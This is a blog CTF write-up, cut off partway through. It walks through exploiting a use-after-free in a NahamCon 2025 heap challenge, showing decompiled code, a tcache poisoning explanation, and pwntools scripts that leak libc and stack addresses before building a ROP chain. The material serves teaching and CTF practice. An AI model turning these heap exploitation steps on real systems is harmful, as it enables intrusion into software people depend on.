<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="These two challenges from Nahamcon CTF 2025 will abuse tcache with Use-After-Free primitives to hijack control flow of a program without PIE and a program with PIE. Lost Memory1234567891011anthonyjs@f">
<meta property="og:type" content="article">
<meta property="og:title" content="Lost &amp; Found Memory">
<meta property="og:url" content="http://anthony-js.info/writeups/tcache-poisoning/">
<meta property="og:site_name" content="anthonyjs">
<meta property="og:description" content="These two challenges from Nahamcon CTF 2025 will abuse tcache with Use-After-Free primitives to hijack control flow of a program without PIE and a program with PIE. Lost Memory1234567891011anthonyjs@f">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-05-16T03:41:55.122Z">
<meta property="article:modified_time" content="2025-05-28T18:53:45.011Z">
<meta property="article:author" content="anthonyjs">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Lost &amp; Found Memory</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/writeups/dice-badge/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/writeups/screenwriter/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/tcache-poisoning/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/tcache-poisoning/&text=Lost &amp; Found Memory"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/tcache-poisoning/&is_video=false&description=Lost &amp; Found Memory"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Lost &amp; Found Memory&body=Check out this article: http://anthony-js.info/writeups/tcache-poisoning/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/tcache-poisoning/&name=Lost &amp; Found Memory&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/tcache-poisoning/&t=Lost &amp; Found Memory"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lost-Memory"><span class="toc-number">1.</span> <span class="toc-text">Lost Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">1.1.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Found-Memory"><span class="toc-number">2.</span> <span class="toc-text">Found Memory</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Lost &amp; Found Memory
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">anthonyjs</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-05-16T03:41:55.122Z" class="dt-published" itemprop="datePublished">2025-05-15</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>These two challenges from Nahamcon CTF 2025 will abuse tcache with Use-After-Free primitives to hijack control flow of a program without PIE and a program with PIE.</p>
<h2 id="Lost-Memory"><a href="#Lost-Memory" class="headerlink" title="Lost Memory"></a>Lost Memory</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">anthonyjs@frosty:~$ checksec --file lost_memory </span><br><span class="line">[*] &#x27;/home/anthonyjs/lost_memory&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    RUNPATH:    b&#x27;./&#x27;</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>Quick look at protections here reveals that the GOT is writable and there is neither PIE or canaries. A quick peek at the libc that the binary was built with also reveals that we are looking at <code>libc 2.31</code>.</p>
<h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><p>Very quickly we can scout that this is a standard CRUD application:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Allocate Memory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Write to Memory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Select Index&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Free Memory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Store Flag Return Value&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;6. Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your choice:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Important things to check here are:</p>
<ul>
<li>How many chunks can we allocate?</li>
<li>How big can we allocate?</li>
<li>What happens when we free a chunk?</li>
<li>Can we mess with a chunk after its been freed?</li>
</ul>
<p>For allocating:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;What size would you like?&quot;</span>);</span><br><span class="line">fgets(&amp;input,<span class="number">256</span>,<span class="built_in">stdin</span>);</span><br><span class="line">size = atol(&amp;input);</span><br><span class="line"><span class="built_in">memset</span>(&amp;input,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">uVar1 = memIndex;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">256</span> &lt; size) <span class="keyword">break</span>;</span><br><span class="line">pvVar2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">*(<span class="type">void</span> **)(ptr + uVar1 * <span class="number">8</span>) = pvVar2;</span><br><span class="line">*(<span class="type">int</span> *)(ptrSize + memIndex * <span class="number">4</span>) = (<span class="type">int</span>)size;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocated memory&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>We see that we can allocate up to <code>256</code> bytes maximum.</p>
<p>For selecting an index:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Select an index to write to (0 - %d)\n &quot;</span>,<span class="number">9</span>);</span><br><span class="line">fgets(&amp;input,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">memIndex = atol(&amp;input);</span><br><span class="line"><span class="built_in">memset</span>(&amp;input,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">9</span> &lt; memIndex) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We see that we can only have up to <code>9</code> allocations.</p>
<p>Now knowing that 256 is our max size and we can only maintain 9 allocations at a time, its pretty obvious were going to be in tcache land.<br>Youâ€™ll also notice here that no checks on if the index is null (unallocated) are taken.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to write?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fgets(&amp;input,<span class="number">256</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (input == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No input provided&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Writing to memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(*(<span class="type">void</span> **)(ptr + memIndex * <span class="number">8</span>),&amp;input,(<span class="type">long</span>)*(<span class="type">int</span> *)(ptrSize + memIndex * <span class="number">4</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ptr[memIndex] = %s\n&quot;</span>,*(undefined8 *)(ptr + memIndex * <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input = %s\n&quot;</span>,&amp;input);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;input,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">long</span> *)(ptr + memIndex * <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No memory to free&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Freeing memory...&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(ptr + memIndex * <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We do see a check here when freeing to avoid freeing a null ptr, but after freeing a valid pointer it is never set to null so this case will only ever be hit when the index was never initialized.</p>
<p>We now know that we have a valid <code>Use-After-Free</code> primitive and we do not have <code>PIE</code> or <code>Safe Linking</code>.</p>
<p>We can turn this into an arbitrary allocation primitive very easily.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache</span> <span class="title">entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>This is what a tcache entry looks like when the chunk is freed and placed into tcache. Having two chunks in tcache will look something like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chunk_two &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span> =</span> &amp;chunk_one;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span> =</span> &amp;tcache_struct;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">chunk_one &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span> =</span> &amp;tcache_struct;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Now when you allocate the same size of said chunk, you will be returned the first item in the list (here it would be <code>chunk_two</code>). The next item in the list would then become the next pointed to chunk given by chunk_two. But we already established that we could change a chunk after it was freed. This will allow us to overwrite what that next pointer is and then when we call malloc(size) again, we will be returned the address that we fabricated.</p>
<p>This will be useful in leaking libc for us and for allocating somewhere for us to throw a rop chain later on.</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#x27;./lost_memory&#x27;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slot</span>(<span class="params">offset</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;9)&#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># slot 0 = 16</span></span><br><span class="line"></span><br><span class="line">slot(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># slot 1 = 16</span></span><br><span class="line"></span><br><span class="line">free() <span class="comment"># slot 1 freed</span></span><br><span class="line">slot(<span class="number">0</span>)</span><br><span class="line">free() <span class="comment"># slot 0 freed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite slot 0 to overwrite next ptr</span></span><br><span class="line">write(p64(elf.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">slot(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># getting to that next ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next 16 malloc will return the address of elf.got[&#x27;free&#x27;]-0x10 </span></span><br><span class="line">slot(<span class="number">4</span>)</span><br><span class="line">malloc(<span class="number">16</span>)</span><br><span class="line">write(<span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span>) <span class="comment"># fill the 0x10 so we can print using %s</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>) - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>

<p>The next challenge is figuring out where we want to write our rop chain in order to get control flow. We know we can allocate wherever we want, but where do we want to?</p>
<p>Luckily for us, this feature in the code leaks a stack address:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (choice != <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">6</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Storing flag return value&quot;</span>);</span><br><span class="line">  **(<span class="type">long</span> **)(ptr + memIndex * <span class="number">8</span>) = (<span class="type">long</span>)local_20;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Stored return value: %p\n&quot;</span>,**(undefined8 **)(ptr + memIndex * <span class="number">8</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Stored return value: %p\n&quot;</span>,local_20);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>From here we can take this stack address and calculate the return address on the stack. From there we simply place our rop chain and get the function to return.</p>
<p>Full solve script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#x27;./lost_memory&#x27;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slot</span>(<span class="params">offset</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;9)&#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># slot 0 = 16</span></span><br><span class="line"></span><br><span class="line">slot(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># slot 1 = 16</span></span><br><span class="line"></span><br><span class="line">free() <span class="comment"># slot 1 freed</span></span><br><span class="line">slot(<span class="number">0</span>)</span><br><span class="line">free() <span class="comment"># slot 0 freed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite slot 0 to overwrite next ptr</span></span><br><span class="line">write(p64(elf.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">slot(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">16</span>) <span class="comment"># getting to that next ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next 16 malloc will return the address of elf.got[&#x27;free&#x27;]-0x10 </span></span><br><span class="line">slot(<span class="number">4</span>)</span><br><span class="line">malloc(<span class="number">16</span>)</span><br><span class="line">write(<span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span>) <span class="comment"># fill the 0x10 so we can print using %s</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>) - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># goal now is to leak stack using that weird thing</span></span><br><span class="line"><span class="comment"># then write rop chain in return ptr</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;return value: &#x27;</span>)</span><br><span class="line">rip = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now lets do the whole arb allocation 